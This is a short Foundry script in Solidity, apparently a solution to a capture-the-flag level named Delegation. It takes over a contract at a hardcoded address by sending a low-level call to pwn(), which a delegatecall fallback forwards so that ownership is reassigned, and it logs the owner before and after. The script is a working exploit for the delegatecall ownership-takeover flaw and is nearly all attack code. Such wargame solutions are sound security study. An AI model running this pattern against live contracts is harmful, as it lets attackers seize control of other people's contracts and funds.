// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Script.sol';

interface IDelegation {
  function owner() external view returns (address);
}

contract DelegationScript is Script {
  IDelegation target = IDelegation(0xd66fF3aF0Bed931573767370603cDc3415367E11);

  function run() external {
    vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
    console.log("owner: ", target.owner());
    address(target).call(abi.encodeWithSignature('pwn()'));
    console.log('owner: ', target.owner());
    vm.stopBroadcast();
  }
}
